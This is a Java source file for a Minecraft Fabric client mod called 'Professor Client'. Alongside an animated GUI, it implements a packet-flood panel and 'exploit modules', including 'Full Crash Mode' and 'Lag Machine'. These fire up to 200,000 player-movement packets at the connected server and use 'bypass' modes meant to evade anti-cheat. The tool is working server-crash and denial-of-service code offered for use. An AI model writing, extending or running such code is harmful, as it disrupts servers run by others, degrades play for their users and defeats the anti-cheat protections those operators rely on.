package com.professor.client.gui;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.math.MathHelper;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ── Particles ──────────────────────────────────────────────────────────
    private static final int PCNT = 160;
    private final float[] ppx   = new float[PCNT];
    private final float[] ppy   = new float[PCNT];
    private final float[] pvx   = new float[PCNT];
    private final float[] pvy   = new float[PCNT];
    private final float[] psz   = new float[PCNT];
    private final float[] palp  = new float[PCNT];
    private final float[] pph   = new float[PCNT];  // phase

    // ── Mouse trail  [x, y, age] ───────────────────────────────────────────
    private final LinkedList<int[]> trail = new LinkedList<>();

    // ── Tab animation ──────────────────────────────────────────────────────
    private int   tab      = 0;
    private float tabAnim  = 1f;   // 0=start, 1=settled
    private int   tabDir   = 1;    // 1=new comes from right, -1=from left

    // ── Button hover  [x, y, w, h, hover-t] for each button region ─────────
    private final List<float[]> hoverRects = new ArrayList<>();

    // ── UI state ───────────────────────────────────────────────────────────
    private int           bypassMode  = 0;
    private TextFieldWidget pktField   = null;
    private String        statusText  = "";
    private int           statusColor = 0xFF00AAFF;
    private int           statusTimer = 0;
    private long          tick        = 0;
    private float         scanY       = 0;
    private float         glowPulse   = 0f;
    private boolean       glowUp      = true;

    // ── Data streams for BG ────────────────────────────────────────────────
    private static final String DS_CHARS = "PROFESSOR01アカサタナ";
    private final float[] dsX = new float[60];
    private final float[] dsY = new float[60];
    private final float[] dsSp= new float[60];
    private final int[]   dsCh= new int[60];

    private static final String[] TABS   = {"  FLOOD  ", " EXPLOITS ", "  CONFIG  "};
    private static final String[] BYPASS = {"OFF", "BURST", "MIXED", "MAX"};
    private static final int PW = 450, PH = 310;

    private final Random rng = new Random();

    // ── Constructor ────────────────────────────────────────────────────────

    public ProfessorScreen() {
        super(Text.literal("Professor Client"));
        initParticles();
    }

    // ── Lifecycle ──────────────────────────────────────────────────────────

    @Override
    protected void init() {
        initParticles();
        initDataStreams();
        rebuild();
        ProfessorMusicManager.onOpen(client);
    }

    @Override
    public void removed() {
        ProfessorMusicManager.onClose(client);
        super.removed();
    }

    // ── Particle init ──────────────────────────────────────────────────────

    private void initParticles() {
        for (int i = 0; i < PCNT; i++) {
            ppx[i] = rng.nextFloat() * 1920;
            ppy[i] = rng.nextFloat() * 1080;
            pvx[i] = (rng.nextFloat() - 0.5f) * 0.55f;
            pvy[i] = -(rng.nextFloat() * 0.65f + 0.12f);
            psz[i] = rng.nextFloat() * 2.2f + 0.5f;
            palp[i]= rng.nextFloat() * 0.75f + 0.25f;
            pph[i] = rng.nextFloat() * 6.28f;
        }
    }

    private void initDataStreams() {
        int cols = Math.min(60, Math.max(1, width / 16));
        for (int i = 0; i < 60; i++) {
            dsX[i] = i * (width / 60f);
            dsY[i] = rng.nextFloat() * -height;
            dsSp[i]= rng.nextFloat() * 1.1f + 0.4f;
            dsCh[i]= rng.nextInt(DS_CHARS.length());
        }
    }

    // ── Widget rebuild ─────────────────────────────────────────────────────

    private void rebuild() {
        clearChildren();
        hoverRects.clear();

        int cx = width / 2, cy = height / 2;
        int bpx = cx - PW/2, bpy = cy - PH/2;

        // ── Tab strip buttons ──
        int tabW = (PW - 16) / 3;
        for (int i = 0; i < 3; i++) {
            final int idx = i;
            int bx = bpx + 8 + i * (tabW + 2);
            addDrawableChild(
                ButtonWidget.builder(Text.literal(TABS[i]), b -> switchTab(idx))
                    .dimensions(bx, bpy + 40, tabW, 18).build()
            );
        }

        // ── Tab content ──
        if      (tab == 0) buildFlood(cx, bpy);
        else if (tab == 1) buildExploits(cx, bpy);
        else               buildConfig(cx, bpy);

        // ── Close ──
        addDrawableChild(
            ButtonWidget.builder(Text.literal("\u2716  CLOSE"), b -> close())
                .dimensions(cx - 38, bpy + PH - 26, 76, 18).build()
        );
    }

    private void switchTab(int newTab) {
        if (newTab == tab) return;
        tabDir  = newTab > tab ? 1 : -1;
        tab     = newTab;
        tabAnim = 0f;
        pktField = null;
        rebuild();
    }

    // ── FLOOD tab ──────────────────────────────────────────────────────────

    private void buildFlood(int cx, int bpy) {
        // Packet count field
        pktField = new TextFieldWidget(textRenderer, cx - 58, bpy + 90, 116, 16, Text.empty());
        pktField.setMaxLength(6);
        pktField.setText("10000");
        addSelectableChild(pktField);

        // Presets
        int[][] presets = {{100,-128},{1000,-40},{10000,48},{100000,135}};
        for (int[] p : presets) {
            int cnt = p[0], ox = p[1];
            addDrawableChild(ButtonWidget.builder(
                Text.literal(cnt >= 1000 ? (cnt/1000) + "K" : "" + cnt),
                b -> pktField.setText("" + cnt))
                .dimensions(cx + ox - 23, bpy + 110, 46, 14).build());
        }

        // Bypass toggle
        addDrawableChild(ButtonWidget.builder(
            Text.literal("Bypass: " + BYPASS[bypassMode]),
            b -> { bypassMode = (bypassMode + 1) % BYPASS.length;
                   b.setMessage(Text.literal("Bypass: " + BYPASS[bypassMode])); })
            .dimensions(cx - 58, bpy + 128, 116, 16).build());

        // Send
        addDrawableChild(ButtonWidget.builder(
            Text.literal("\u25BA\u25BA\u25BA  SEND PACKETS  \u25C4\u25C4\u25C4"),
            b -> doSend())
            .dimensions(cx - 102, bpy + 150, 204, 22).build());
    }

    // ── EXPLOITS tab ───────────────────────────────────────────────────────

    private void buildExploits(int cx, int bpy) {
        int bw = 276, bx = cx - bw / 2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Swing Flood  \u2014 EF Bypass"),      b -> swingFlood()).dimensions(bx, bpy + 68,  bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Position Desync  \u2014 Timer EF"),   b -> posDesync()) .dimensions(bx, bpy + 90,  bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Lag Machine  \u2014 50K Burst"),       b -> lagMachine()).dimensions(bx, bpy + 112, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Full Crash Mode  \u2014 200K PKT"),    b -> fullCrash()) .dimensions(bx, bpy + 134, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Y-Axis Glitch  \u2014 Anti-Fly EF"),  b -> yGlitch())   .dimensions(bx, bpy + 156, bw, 18).build());
    }

    // ── CONFIG tab ─────────────────────────────────────────────────────────

    private void buildConfig(int cx, int bpy) {
        int bx = cx - 118;
        addDrawableChild(ButtonWidget.builder(Text.literal("Keybind:  M  \u2014  Controls menu"), b -> {})                          .dimensions(bx, bpy + 78,  236, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Clear Status"),                       b -> { statusText=""; statusTimer=0; }).dimensions(bx, bpy + 100, 236, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Professor Client  v2.0  \u2014  Blue Edition"), b -> {})                  .dimensions(bx, bpy + 122, 236, 18).build());
    }

    // ── Packet logic ───────────────────────────────────────────────────────

    private void doSend() {
        if (notConn()) return;
        int n;
        try { n = Integer.parseInt(pktField.getText().trim()); }
        catch (Exception e) { setStatus("Invalid number!", 0xFFFF4444); return; }
        if (n < 1 || n > 100_000) { setStatus("Range: 1 to 100,000", 0xFFFF8800); return; }
        double x = client.player.getX(), y = client.player.getY(), z = client.player.getZ();
        float  yw = client.player.getYaw(), pt = client.player.getPitch();
        boolean g = client.player.isOnGround();
        switch (bypassMode) {
            case 0 -> { for (int i=0;i<n;i++) send(x,y,z,yw,pt,g); }
            case 1 -> { for (int i=0;i<n;i++) send(x, i%2==0?y:y+0.001, z, yw, pt, g); }
            case 2 -> { for (int i=0;i<n;i++) { send(x,y+(i%3)*0.0005,z,yw+(i%2),pt,g); send(x,y,z,yw,pt,g); } }
            case 3 -> { for (int i=0;i<n;i++) { send(x,y+(i%8)*0.0001,z,yw+(i%6),pt,false); send(x,y,z,yw,pt,g); } }
        }
        setStatus("Sent " + n + " pkts  |  Bypass: " + BYPASS[bypassMode], 0xFF00BBFF);
    }

    private void swingFlood() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        for (int i=0;i<8000;i++) send(x,y+(i%4)*0.0001,z,yw+(i%3),pt,true);
        setStatus("[EF BYPASS] Swing Flood — 8,000 pkts!", 0xFF00FFCC);
    }

    private void posDesync() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        for (int i=0;i<3000;i++) send(x,i%2==0?y+200.0:y,z,yw,pt,false);
        setStatus("[EF BYPASS] Position Desync — Timer exploit!", 0xFF00FFCC);
    }

    private void lagMachine() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        boolean g=client.player.isOnGround();
        for (int i=0;i<50000;i++) { send(x,y+i*0.00001,z,yw,pt,g); if(i%3==0) send(x,y,z,yw+(i%8),pt,g); }
        setStatus("[EF BYPASS] Lag Machine — ~67K pkts sent!", 0xFFFF6600);
    }

    private void fullCrash() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        for (int i=0;i<100000;i++) { send(x,y+(i%500)*0.0001,z,yw+(i%4),pt,false); send(x,y,z,yw,pt,false); }
        setStatus("[EF BYPASS] FULL CRASH — 200K pkts fired!", 0xFFFF2200);
    }

    private void yGlitch() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        for (int i=0;i<10000;i++) {
            double dy=switch(i%4){case 0->y+256;case 1->y-64;case 2->y+0.42;default->y;};
            send(x,dy,z,yw,pt,i%2==0);
        }
        setStatus("[EF BYPASS] Y-Axis Glitch — Anti-fly desync!", 0xFF00FFCC);
    }

    private void send(double x, double y, double z, float yw, float pt, boolean g) {
        if (client!=null && client.player!=null && client.player.networkHandler!=null)
            client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(x,y,z,yw,pt,g));
    }

    private boolean notConn() {
        if (client==null||client.player==null) { setStatus("Not connected!", 0xFFFF4444); return true; }
        return false;
    }

    private void setStatus(String m, int c) { statusText=m; statusColor=c; statusTimer=200; }

    // ── Tick ───────────────────────────────────────────────────────────────

    @Override
    public void tick() {
        super.tick();
        if (statusTimer > 0) statusTimer--;
        tabAnim = Math.min(1f, tabAnim + 0.09f);
        glowPulse += glowUp ? 0.04f : -0.04f;
        if      (glowPulse >= 1f) { glowPulse = 1f; glowUp = false; }
        else if (glowPulse <= 0f) { glowPulse = 0f; glowUp = true;  }
        scanY = (scanY + 2.2f) % PH;
    }

    // ── Render ─────────────────────────────────────────────────────────────

    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        int W = width, H = height, cx = W/2, cy = H/2;
        int bpx = cx - PW/2, bpy = cy - PH/2;

        // === Background ===
        ctx.fill(0, 0, W, H, 0xFF000A14);
        drawGrid(ctx, W, H);
        updateAndDrawDataStreams(ctx, W, H);
        updateAndDrawParticles(ctx, W, H);
        drawCenterGlow(ctx, cx, cy);

        // === Mouse trail (behind panel) ===
        updateTrail(mx, my);
        drawTrail(ctx);

        // === Panel shadow ===
        ctx.fill(bpx+8, bpy+8, bpx+PW+8, bpy+PH+8, 0x55000000);

        // === Panel background ===
        ctx.fill(bpx, bpy, bpx+PW, bpy+PH, 0xEE000A18);

        // === Animated RGB border ===
        float t = (float)(tick * 0.04);
        int bR = Math.max(0, (int)(20  + 35  * Math.sin(t)));
        int bG = Math.max(0, (int)(130 + 80  * Math.sin(t + 2.094)));
        int bB = Math.max(0, (int)(220 + 35  * Math.sin(t + 4.188)));
        int bc  = 0xFF000000 | (bR<<16) | (bG<<8) | bB;
        int bcd = 0x77000000 | (bR<<16) | (bG<<8) | bB;
        ctx.fill(bpx,       bpy,       bpx+PW,   bpy+2,    bc);
        ctx.fill(bpx,       bpy+PH-2,  bpx+PW,   bpy+PH,   bc);
        ctx.fill(bpx,       bpy,       bpx+2,    bpy+PH,   bc);
        ctx.fill(bpx+PW-2,  bpy,       bpx+PW,   bpy+PH,   bc);
        ctx.fill(bpx+2,     bpy+2,     bpx+PW-2, bpy+3,    bcd);
        ctx.fill(bpx+2,     bpy+PH-3,  bpx+PW-2, bpy+PH-2, bcd);

        // Corner brackets
        drawPanelCorners(ctx, bpx, bpy, bc);

        // Scanline inside panel
        ctx.fill(bpx, bpy+(int)scanY, bpx+PW, bpy+(int)scanY+1, 0x09FFFFFF);

        // === Title bar ===
        drawTitle(ctx, cx, bpy, bR, bG, bB);

        // Separator below title
        ctx.fill(bpx+8, bpy+60, bpx+PW-8, bpy+61, 0x33005599);

        // Active tab label
        String tabLabel = "\u25B6 " + TABS[tab].trim() + " \u25C4";
        ctx.drawText(textRenderer, tabLabel, bpx+14, bpy+64, bc, false);

        // === Tab slide: draw content labels (non-widget text) with offset ===
        int slideOff = (int)((1f - easeOut(tabAnim)) * PW / 2 * tabDir);
        drawTabContent(ctx, cx, bpy, bpx, mx, my, slideOff);

        // === Widgets ===
        if (pktField != null) pktField.render(ctx, mx, my, delta);
        super.render(ctx, mx, my, delta);

        // === Status bar ===
        drawStatus(ctx, cx, bpx, bpy);

        // === Music bar ===
        drawMusicBar(ctx, bpx, bpy);

        // === Cursor glow (topmost) ===
        drawCursorGlow(ctx, mx, my);
    }

    // ── Background draws ───────────────────────────────────────────────────

    private void drawGrid(DrawContext ctx, int W, int H) {
        int col = 0x07005599;
        for (int x = 0; x < W; x += 46) ctx.fill(x, 0, x+1, H, col);
        for (int y = 0; y < H; y += 46) ctx.fill(0, y, W, y+1, col);
    }

    private void updateAndDrawDataStreams(DrawContext ctx, int W, int H) {
        for (int i = 0; i < 60; i++) {
            dsY[i] += dsSp[i];
            if (dsY[i] > H + 20) { dsY[i] = -20; dsCh[i] = rng.nextInt(DS_CHARS.length()); }
            if (rng.nextInt(28) == 0) dsCh[i] = rng.nextInt(DS_CHARS.length());
            if (dsY[i] < 0) continue;
            int hA = (int)(30 + 20 * glowPulse);
            ctx.drawText(textRenderer, String.valueOf(DS_CHARS.charAt(dsCh[i])),
                (int)dsX[i]-4, (int)dsY[i], (Math.min(255,hA*2)<<24)|0x0088CC, false);
            if (dsY[i] > 14)
                ctx.drawText(textRenderer, String.valueOf(DS_CHARS.charAt(dsCh[i])),
                    (int)dsX[i]-4, (int)dsY[i]-14, (hA<<24)|0x003366, false);
        }
    }

    private void updateAndDrawParticles(DrawContext ctx, int W, int H) {
        for (int i = 0; i < PCNT; i++) {
            ppx[i] += pvx[i]; ppy[i] += pvy[i]; pph[i] += 0.045f;
            if (ppy[i] < -10) { ppy[i] = H+5;  ppx[i] = rng.nextFloat()*W; }
            if (ppx[i] < 0)   ppx[i] = W;
            if (ppx[i] > W)   ppx[i] = 0;
            float tw = (MathHelper.sin(pph[i]) + 1f) / 2f;
            int a = (int)(palp[i] * tw * 200);
            if (a < 10) continue;
            int col = (a<<24) | (psz[i]>1.8f ? 0x0088BB : 0x004477);
            int sz  = psz[i]>2f ? 2 : 1;
            ctx.fill((int)ppx[i], (int)ppy[i], (int)ppx[i]+sz, (int)ppy[i]+sz, col);
        }
    }

    private void drawCenterGlow(DrawContext ctx, int cx, int cy) {
        int[] radii  = {300, 210, 140, 80};
        int[] alphas = {  5,   9,  14, 22};
        for (int i = 0; i < 4; i++) {
            int r = radii[i];
            int a = (int)(alphas[i] * (0.5f + 0.5f * glowPulse));
            ctx.fill(cx-r, cy-r/2, cx+r, cy+r/2, (a<<24)|0x0055AA);
        }
    }

    // ── Mouse trail & cursor ───────────────────────────────────────────────

    private void updateTrail(int mx, int my) {
        trail.addFirst(new int[]{mx, my, 0});
        if (trail.size() > 20) trail.removeLast();
        for (int[] p : trail) p[2]++;
    }

    private void drawTrail(DrawContext ctx) {
        for (int[] p : trail) {
            int age = p[2];
            if (age == 0) continue;
            int a = Math.max(0, 200 - age * 11);
            if (a <= 0) continue;
            int r = 2 + age / 3;
            int col = (a<<24) | 0x0077BB;
            ctx.fill(p[0]-r, p[1]-1, p[0]+r, p[1]+1, col);
            ctx.fill(p[0]-1, p[1]-r, p[0]+1, p[1]+r, col);
        }
    }

    private void drawCursorGlow(DrawContext ctx, int mx, int my) {
        int[] rad = {22, 13, 6};
        int[] alp = {12, 32, 70};
        for (int i = 0; i < 3; i++) {
            int r = rad[i];
            int a = (int)(alp[i] * (0.65f + 0.35f * glowPulse));
            int col = (a<<24) | 0x00AAFF;
            ctx.fill(mx-r, my-1, mx+r, my+1, col);
            ctx.fill(mx-1, my-r, mx+1, my+r, col);
        }
        ctx.fill(mx-2, my-2, mx+2, my+2, 0xCC00D4FF);
    }

    // ── Panel draws ────────────────────────────────────────────────────────

    private void drawPanelCorners(DrawContext ctx, int bpx, int bpy, int c) {
        int s = 14;
        ctx.fill(bpx,       bpy,       bpx+s,   bpy+2,   c);
        ctx.fill(bpx,       bpy,       bpx+2,   bpy+s,   c);
        ctx.fill(bpx+PW-s,  bpy,       bpx+PW,  bpy+2,   c);
        ctx.fill(bpx+PW-2,  bpy,       bpx+PW,  bpy+s,   c);
        ctx.fill(bpx,       bpy+PH-2,  bpx+s,   bpy+PH,  c);
        ctx.fill(bpx,       bpy+PH-s,  bpx+2,   bpy+PH,  c);
        ctx.fill(bpx+PW-s,  bpy+PH-2,  bpx+PW,  bpy+PH,  c);
        ctx.fill(bpx+PW-2,  bpy+PH-s,  bpx+PW,  bpy+PH,  c);
    }

    private void drawTitle(DrawContext ctx, int cx, int bpy, int r, int g, int b) {
        float p = (float)((Math.sin(tick * 0.06) + 1.0) / 2.0);
        int cr = Math.min(255, (int)(r * 0.4f + p * r * 0.6f));
        int cg = Math.min(255, (int)(g * 0.4f + p * g * 0.6f));
        int cb = Math.min(255, (int)(b * 0.4f + p * b * 0.6f));
        int col = 0xFF000000 | (cr<<16) | (cg<<8) | cb;
        String t = "PROFESSOR CLIENT";
        int tw = textRenderer.getWidth(t);
        // Glow layers
        int gA = (int)(18 + 14 * glowPulse);
        for (int dx = -3; dx <= 3; dx++) {
            int g2 = Math.max(0, gA - Math.abs(dx)*7);
            if (g2>0) {
                ctx.drawText(textRenderer, t, cx-tw/2+dx, bpy+13, (g2<<24)|0x0066AA, false);
                ctx.drawText(textRenderer, t, cx-tw/2,    bpy+13+dx, (g2<<24)|0x0066AA, false);
            }
        }
        ctx.drawText(textRenderer, t, cx-tw/2, bpy+13, col, false);

        // Subtitle
        String sub = "v2.0  \u2502  Fabric 1.21.1  \u2502  Blue Edition";
        ctx.drawText(textRenderer, sub, cx - textRenderer.getWidth(sub)/2, bpy+24, 0xFF002233, false);

        // Status dot
        String dot = "\u25CF ACTIVE" + "...".substring(0, (int)(tick/10)%4);
        int dotCol = 0xFF000000 | (0<<16) | (Math.min(255,(int)(100+80*glowPulse))<<8) | Math.min(255,(int)(180+75*glowPulse));
        ctx.drawText(textRenderer, dot, cx - textRenderer.getWidth("● ACTIVE...")/2, bpy+36, dotCol, false);
    }

    private void drawTabContent(DrawContext ctx, int cx, int bpy, int bpx, int mx, int my, int soff) {
        // Draw any pure-text labels for the active tab, offset by soff for slide effect
        if (tab == 0) {
            // Flood labels
            ctx.drawText(textRenderer, "Packet Count:", cx - textRenderer.getWidth("Packet Count:")/2, bpy+76+soff, 0x9900BBFF, false);
            ctx.drawText(textRenderer, "Presets:", cx - 85, bpy+96+soff, 0x7700AADD, false);
        } else if (tab == 1) {
            // Exploits heading
            String h = "\u26A0  EXPLOIT MODULES  \u26A0";
            ctx.drawText(textRenderer, h, cx - textRenderer.getWidth(h)/2, bpy+55, 0xFF003355, false);
        } else {
            // Config heading
            String h = "\u2699  SETTINGS  \u2699";
            ctx.drawText(textRenderer, h, cx - textRenderer.getWidth(h)/2, bpy+62, 0xFF003355, false);
        }
    }

    private void drawStatus(DrawContext ctx, int cx, int bpx, int bpy) {
        if (statusTimer <= 0 || statusText.isEmpty()) return;
        int a   = Math.min(255, statusTimer * 2);
        int col = (statusColor & 0x00FFFFFF) | (a << 24);
        ctx.fill(bpx+4, bpy+PH-22, bpx+PW-4, bpy+PH-4, 0x88000000);
        ctx.drawText(textRenderer, statusText,
            cx - textRenderer.getWidth(statusText)/2, bpy+PH-17, col, false);
    }

    private void drawMusicBar(DrawContext ctx, int bpx, int bpy) {
        boolean playing = ProfessorMusicManager.isPlaying(client);
        float   prog    = ProfessorMusicManager.getVisualProgress();
        int barX = bpx + 8, barY = bpy + PH - 36, barW = PW - 16, barH = 3;

        // Track
        ctx.fill(barX, barY, barX+barW, barY+barH, 0x22004488);
        // Fill
        int fillW = (int)(barW * prog);
        if (fillW > 0) ctx.fill(barX, barY, barX+fillW, barY+barH, 0x88008FCC);

        // Label
        String lbl = playing ? "\u266B MUSIC  PLAYING" : "\u266B MUSIC  PAUSED";
        int lA = (int)(80 + 40 * glowPulse);
        ctx.drawText(textRenderer, lbl, barX, barY - 8, (lA<<24) | (playing ? 0x007799 : 0x004466), false);
    }

    // ── Utility ────────────────────────────────────────────────────────────

    private float easeOut(float t) { return 1f - (1f - t) * (1f - t); }

    // ── Input forwards ─────────────────────────────────────────────────────

    @Override public boolean keyPressed(int kc, int sc, int m) {
        if (pktField!=null && pktField.isFocused() && pktField.keyPressed(kc,sc,m)) return true;
        return super.keyPressed(kc,sc,m);
    }
    @Override public boolean charTyped(char c, int m) {
        if (pktField!=null && pktField.isFocused()) return pktField.charTyped(c,m);
        return super.charTyped(c,m);
    }
    @Override public boolean mouseClicked(double mx, double my, int b) {
        if (pktField!=null) pktField.mouseClicked(mx,my,b);
        return super.mouseClicked(mx,my,b);
    }

    @Override public boolean shouldPause()      { return false; }
    @Override public boolean shouldCloseOnEsc() { return true;  }
}
